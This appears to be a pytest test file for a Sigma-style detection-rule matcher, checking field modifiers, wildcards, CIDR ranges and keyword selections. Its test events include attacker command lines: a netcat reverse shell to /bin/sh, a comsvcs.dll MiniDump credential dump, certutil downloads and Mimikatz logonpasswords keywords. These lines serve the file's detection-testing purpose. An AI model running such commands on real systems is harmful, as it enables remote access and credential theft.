import pytest

from detlab.matcher import FieldMatcher, RuleSyntaxError, Selection, lookup, sigma_to_regex


def fm(key, value):
    return FieldMatcher.parse(key, value)


def test_plain_value_is_exact_and_case_insensitive():
    m = fm("Image", "C:\\Windows\\System32\\cmd.exe")
    assert m.matches({"Image": "c:\\windows\\system32\\CMD.EXE"})
    assert not m.matches({"Image": "C:\\Windows\\System32\\cmd.exe.bak"})


@pytest.mark.parametrize(
    "mod,value,hit,miss",
    [
        ("contains", "urlcache", "certutil -URLCACHE -f", "certutil -hashfile"),
        ("startswith", "C:\\Users\\", "C:\\Users\\bob\\a.exe", "D:\\C:\\Users\\"),
        ("endswith", "\\rundll32.exe", "C:\\Windows\\rundll32.exe", "C:\\rundll32.exe.mui"),
    ],
)
def test_transform_modifiers(mod, value, hit, miss):
    m = fm(f"F|{mod}", value)
    assert m.matches({"F": hit})
    assert not m.matches({"F": miss})


def test_value_list_is_or_and_all_modifier_is_and():
    any_of = fm("CommandLine|contains", ["comsvcs", "minidump"])
    all_of = fm("CommandLine|contains|all", ["comsvcs", "minidump"])
    event = {"CommandLine": "rundll32 comsvcs.dll #24"}
    assert any_of.matches(event)
    assert not all_of.matches(event)
    assert all_of.matches({"CommandLine": "rundll32 comsvcs.dll MiniDump 1 x full"})


def test_wildcards_and_escapes():
    assert fm("F", "power*.exe").matches({"F": "powershell.exe"})
    assert fm("F", "cmd?.exe").matches({"F": "cmd1.exe"})
    literal_star = fm("F", "a\\*b")
    assert literal_star.matches({"F": "a*b"})
    assert not literal_star.matches({"F": "aXXb"})


def test_backslash_before_normal_char_is_literal():
    assert sigma_to_regex("C:\\Windows") == "C:\\\\Windows"


def test_regex_modifier_is_case_sensitive_search():
    m = fm("CommandLine|re", r"-e\s+/bin/sh")
    assert m.matches({"CommandLine": "nc 1.2.3.4 99 -e /bin/sh"})
    assert not m.matches({"CommandLine": "nc 1.2.3.4 99 -E /BIN/SH"})


def test_windash_expands_dash_and_slash_forms():
    m = fm("CommandLine|windash|contains", " -enc ")
    assert m.matches({"CommandLine": "powershell -enc AAA"})
    assert m.matches({"CommandLine": "powershell /enc AAA"})
    assert m.matches({"CommandLine": "powershell \u2013enc AAA"})


def test_cidr_modifier():
    m = fm("DestinationIp|cidr", ["10.0.0.0/8", "192.168.0.0/16"])
    assert m.matches({"DestinationIp": "10.20.30.40"})
    assert not m.matches({"DestinationIp": "8.8.8.8"})
    assert not m.matches({"DestinationIp": "not-an-ip"})


def test_exists_and_null():
    assert fm("ParentImage|exists", True).matches({"ParentImage": "x"})
    assert fm("ParentImage|exists", False).matches({"Image": "x"})
    null = fm("CommandLine", None)
    assert null.matches({}) and null.matches({"CommandLine": ""})
    assert not null.matches({"CommandLine": "x"})


def test_numbers_and_list_valued_fields():
    assert fm("EventID", 4625).matches({"EventID": "4625"})
    assert fm("Tags|contains", "lateral").matches({"Tags": ["recon", "lateral-move"]})


def test_nested_dotted_lookup():
    assert lookup({"process": {"name": "bash"}}, "process.name") == (True, "bash")
    assert lookup({"a.b": 1}, "a.b") == (True, 1)
    assert lookup({}, "x.y") == (False, None)


@pytest.mark.parametrize(
    "key,value",
    [
        ("F|bogus", "x"),
        ("F|contains|startswith", "x"),
        ("F|re|contains", "x"),
        ("F|re", "(unclosed"),
        ("F|cidr", "10.0.0.0/33"),
        ("F|exists", "yes"),
        ("F", []),
    ],
)
def test_invalid_field_specs_raise(key, value):
    with pytest.raises(RuleSyntaxError):
        fm(key, value)


def test_selection_list_of_maps_is_or_and_keywords():
    sel = Selection.parse("s", [{"Image|endswith": "\\a.exe"}, {"Image|endswith": "\\b.exe"}])
    assert sel.matches({"Image": "C:\\b.exe"})
    kw = Selection.parse("k", ["mimikatz", "sekurlsa::"])
    assert kw.matches({"CommandLine": "x.exe privilege::debug sekurlsa::logonpasswords"})
    assert kw.matches({"nested": {"deep": "Invoke-Mimikatz"}})
    assert not kw.matches({"CommandLine": "notepad"})
